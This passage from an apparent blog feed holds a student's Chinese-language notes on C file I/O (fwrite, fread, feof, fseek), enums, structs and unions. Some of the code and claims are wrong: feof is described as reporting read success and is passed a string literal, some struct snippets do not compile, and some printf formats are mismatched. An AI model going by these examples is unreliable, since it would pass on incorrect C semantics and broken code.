title="二进制写入："></a>二进制写入：</h2><ol><li><code>fwrite</code>:将buffer的东西存储进流里面<img src="C:\Users\12414\Desktop\C语言笔记\文件操作\文件操作.assets\image-20221113114946926.png" alt="image-20221113114946926"></li></ol><ul><li><p><code>buffer</code>是个指针，地址</p></li><li><p><code>size</code>:元素的大小，单位是字节</p></li><li><p><code>count</code>:元素个数</p></li><li><p>最后为流地址</p></li><li><pre><code class="c">typedef struct student&#123;    char number[20];    char name[10];&#125;stu;int main()&#123;    //文件的创建    FILE* pr = NULL;    pr = fopen(&quot;chg.txt&quot;, &quot;r+&quot;);    stu stu1;    scanf(&quot;%s%s&quot;, stu1.name, stu1.number);    //文件的2进制读写    fwrite(&amp;stu1, sizeof(stu), 1, pr);    //文件的关闭    fclose(pr);    pr = NULL;    return 0;&#125;<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><br>    <br><br><span class="hljs-number">2.</span> `fread`:将流里面的东西读出来![image<span class="hljs-number">-20221113130044448</span>](C:\Users\<span class="hljs-number">12414</span>\Desktop\C语言笔记\文件操作\文件操作.assets\image<span class="hljs-number">-20221113130044448.</span>png)<br><br>  ```c<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">student</span><br>  &#123;<br>  <span class="hljs-type">char</span> number[<span class="hljs-number">20</span>];<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">10</span>];<br>  &#125;stu;<br>  <br>  <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>  <span class="hljs-comment">//文件的创建</span><br>  FILE* pr = <span class="hljs-literal">NULL</span>;<br>  pr = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;chg.txt&quot;</span>, <span class="hljs-string">&quot;r+&quot;</span>);<br>  stu stu1;<br>  <span class="hljs-comment">//文件的2进制读写</span><br>  <span class="hljs-built_in">fread</span>(&amp;stu1,<span class="hljs-built_in">sizeof</span>(stu1),<span class="hljs-number">1</span>,pr);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n%s&quot;</span>, stu1.name, stu1.number);<br>  <span class="hljs-comment">//文件的关闭</span><br>  <span class="hljs-built_in">fclose</span>(pr);<br>  pr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <br></code></pre></td></tr></table></figure></code></pre></li></ul><ol start="3"><li><p>判断文件的读取是否成功</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">feof(<span class="hljs-string">&quot;文件指针&quot;</span>);<span class="hljs-comment">//读取成功返回0，不成功返回非零值</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="fseek"><a href="#fseek" class="headerlink" title="fseek"></a><code>fseek</code></h2><ol><li><p>移动文件内部的指针，达到随机访问的目的</p></li><li><p>实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;   <br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>遵循顺序：创建文件，文件的判断，文件的写入，文件的读取，文件的关闭，记得让指针只向空，文件写入后记得让指针恢复，再进行</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>枚举</title>
    <link href="/2023/04/20/C/%E6%9E%9A%E4%B8%BE/"/>
    <url>/2023/04/20/C/%E6%9E%9A%E4%B8%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><h2 id="常量符号化"><a href="#常量符号化" class="headerlink" title="常量符号化"></a>常量符号化</h2><ol><li><p>用符号而不是具体的数字来表示程序中的数字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">int</span> red=<span class="hljs-number">0</span>;<br><span class="hljs-comment">//然后直接使用类型的名字</span><br><span class="hljs-comment">//等等</span><br></code></pre></td></tr></table></figure></li><li><p>枚举是一种用户定义的数据类型，他用关键字<code>enum</code>来声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> 枚举类型的名字&#123;</span>名字<span class="hljs-number">0</span>······名字n&#125;;<br></code></pre></td></tr></table></figure></li><li><p>枚举类型的名字通常不直接使用，而是使用大括号里面的名字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">colors</span>&#123;</span>red,yellow,green,numcolors&#125;;<br><span class="hljs-comment">//大括号里面的类型是int 他们从0到n</span><br><span class="hljs-comment">//因为最后一个元素可以用于计数，统计前面有多少个enum</span><br><span class="hljs-comment">//如这里，numcolors就表示有3个enum变量</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">color</span>&#123;</span>red=<span class="hljs-number">1</span>,yellow=<span class="hljs-number">5</span>,green=<span class="hljs-number">3</span>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//使用举例：</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">name</span> &#123;</span>red=<span class="hljs-number">1</span>,green=<span class="hljs-number">10</span>,black=<span class="hljs-number">3</span>&#125;;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,red);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>    <br></code></pre></td></tr></table></figure></li><li><p>枚举常用于定义符号量，声明在main以前</p></li></ol><h2 id="结构类型"><a href="#结构类型" class="headerlink" title="结构类型"></a>结构类型</h2><ol><li><p><code>strcut</code>:声明在主函数内外都可以，但是想要结构可以在更多的函数中运用最好放在，主函数外面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//形式1</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> day;<br><span class="hljs-type">int</span> month;<br><span class="hljs-type">int</span> year;<br>&#125;;<br><span class="hljs-comment">//一定要输入分号</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> <span class="hljs-title">today</span>;</span><br>    <span class="hljs-comment">//可以理解为，struct定义了多个数据类型</span><br>    <span class="hljs-comment">//这里给数据起名字为today</span><br>today.day=<span class="hljs-number">244</span>;<br>    <span class="hljs-comment">//名字加数据类型</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,today.day);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//形式二</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>&#125;p1,p2;<br><span class="hljs-comment">//p1和p2都是一种无名结构，里面有x,y</span><br><span class="hljs-comment">//这种类型不常见，用于周期不长</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<span class="hljs-comment">//（成员变量）</span><br>&#125;p1,p2;<span class="hljs-comment">//变量列表</span><br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">point</span> <span class="hljs-title">p</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span><br>&#125;n1=&#123;<span class="hljs-number">10</span>,&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;,<span class="hljs-literal">NULL</span>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>成员初始化是0,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> day;<br><span class="hljs-type">int</span> month;<br><span class="hljs-type">int</span> year;<br>&#125;;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> <span class="hljs-title">today</span>=</span>&#123;<span class="hljs-number">27</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2022</span>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> <span class="hljs-title">chg</span>;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i-%i-%i\n\n&quot;</span>,today.year,today.month,today.day);<br>chg.day=<span class="hljs-number">27</span>;<br>chg.month=<span class="hljs-number">10</span>;<br>chg.year=<span class="hljs-number">2022</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i-%i-%i&quot;</span>,chg.day,chg.month,chg.year);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>结构用.或者-&gt; 运算符和名字访问其他成员，-struct stu</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br>    <span class="hljs-type">int</span> age;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> <span class="hljs-title">chg</span>=</span>&#123;<span class="hljs-string">&quot;chg&quot;</span>,<span class="hljs-number">19</span>&#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> *<span class="hljs-title">i</span>=</span>&amp;chg;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,(*i).name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,i-&gt;name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,chg.name);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>&#125;p1,p2;<br><br><span class="hljs-comment">//访问成员的方式</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> </span><br><span class="hljs-class">    <span class="hljs-title">return</span> 0;</span><br>&#125;<br>p1.x=p1=date.x;<br>p2.y=p2=date.y;<br>p1=p2---&gt;p1.x=p2.x,p1.y=p2.y;<br></code></pre></td></tr></table></figure></li><li><p>结构运算 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> <span class="hljs-title">today</span>=</span>&#123;<span class="hljs-number">27</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2022</span>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> <span class="hljs-title">chg</span>;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i-%i-%i\n\n&quot;</span>,today.year,today.month,today.day);<br>chg.day=<span class="hljs-number">27</span>;<br>chg.month=<span class="hljs-number">10</span>;<br>chg.year=<span class="hljs-number">2022</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i-%i-%i\n\n&quot;</span>,chg.day,chg.month,chg.year);<br>chg=today;<br>chg.year=<span class="hljs-number">2021</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i-%i-%i\n\n&quot;</span>,chg.day,chg.month,chg.year);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li><p>结构内容的打印</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> age;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br>    <span class="hljs-type">int</span> number[<span class="hljs-number">20</span>];<br>    <span class="hljs-comment">//必须加数字</span><br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">student</span> <span class="hljs-title">chg</span>=</span>&#123;<span class="hljs-number">19</span>,chg,<span class="hljs-string">&quot;2022124032&quot;</span>&#125;;<br>    <span class="hljs-comment">//字符串的创建用&quot;&quot;</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d,%d,%s&quot;</span>,chg.age,chg.name,chg.number);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>嵌套结构只能，在主函数定义，不能在结构体里面定义，但需要命名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">time</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> hour;<br><span class="hljs-type">int</span> min;<br><span class="hljs-type">int</span> second;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">today</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">time</span> <span class="hljs-title">now_time</span>;</span><span class="hljs-comment">//不能在这定义now_time的内容，需要定义名字</span><br><span class="hljs-type">int</span> year;<br><span class="hljs-type">int</span> month;<br><span class="hljs-type">int</span> day;<br>&#125;;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">today</span> <span class="hljs-title">TIME</span>=</span>&#123;&#123;<span class="hljs-number">23</span>,<span class="hljs-number">02</span>,<span class="hljs-number">34</span>&#125;,<span class="hljs-number">2022</span>,<span class="hljs-number">10</span>,<span class="hljs-number">28</span>&#125;;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="结构与函数"><a href="#结构与函数" class="headerlink" title="结构与函数"></a>结构与函数</h2><ol><li><p>&amp;可以用取地址取到该结构体变量具体的某一类型的地址，而且可以打印出来 </p></li><li><p>传结构给函数，是传值，如果有函数使用过那该值为0</p></li><li><p>用结构也可以接受函数返回的结构的值</p></li><li><p>将结构体变量传入函数的方法是：将结构体变量地址给函数，函数中用指针接受，然后用指针的用法，指需要用的东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//传址调用</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br>    <span class="hljs-type">int</span> age;<br>&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> stu *chg_1)</span><br>&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,chg_1-&gt;name);<span class="hljs-comment">//chg_1相当于指针的用法</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,(*chg_1).name);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> <span class="hljs-title">chg</span>=</span>&#123;<span class="hljs-string">&quot;chg&quot;</span>,<span class="hljs-number">19</span>&#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> *<span class="hljs-title">i</span>=</span>&amp;chg;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,(*i).name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,i-&gt;name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,chg.name);<br>print(&amp;chg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//传值调用</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br>    <span class="hljs-type">int</span> age;<br>&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print2</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> stu chg_2)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s\n&quot;</span>,chg_2.name);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> <span class="hljs-title">chg</span>=</span>&#123;<span class="hljs-string">&quot;chg&quot;</span>,<span class="hljs-number">19</span>&#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> *<span class="hljs-title">i</span>=</span>&amp;chg;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,(*i).name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,i-&gt;name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,chg.name);<br>print(&amp;chg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>由于传值调用需要开辟新空间，可能导致栈压力过大，所以更好的方法是传址调用</p><ul><li><p>栈存储数据先进后出，后进的先出</p></li><li><p>函数调用的参数压栈，从下往上存储数据时叫压栈，</p></li><li><p>出栈是从上往下删</p></li></ul></li></ol><h2 id="函数与栈区"><a href="#函数与栈区" class="headerlink" title="函数与栈区"></a>函数与栈区</h2><ol><li>函数调用都会在内存的栈区上，开辟新的空间</li><li>函数传参，从右往左传参</li><li>自己写的函数也要占用空间</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>联合体专解</title>
    <link href="/2023/04/20/C/%E8%81%94%E5%90%88%E4%BD%93%E4%B8%93%E8%A7%A3/"/>
    <url>/2023/04/20/C/%E8%81%94%E5%90%88%E4%BD%93%E4%B8%93%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="联合体专解"><a href="#联合体专解" class="headerlink" title="联合体专解"></a>联合体专解</h1><h2 id="共用体的定义"><a href="#共用体的定义" class="headerlink" title="共用体的定义"></a>共用体的定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> 名字</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">//数据</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><ol><li><p>所有变量使用同一个内存，一般为联合体中数据成员占用内存最多的变量的内存</p></li><li><p>在使用时，只有一个变量有效，在初始化时，不能同时初始化，多个变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">Date</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> num;<br><span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">Date</span> <span class="hljs-title">date</span>;</span><br>date.num=<span class="hljs-number">65</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,date.num);<br>    <span class="hljs-comment">//结果为65</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,date.name);<br>    <span class="hljs-comment">//结果为A，虽然没有定义date.name,但是由于共用一个内存，是可以访问的，因为65是A的码值</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图</title>
    <link href="/2023/04/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/"/>
    <url>/2023/04/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/</url>
    
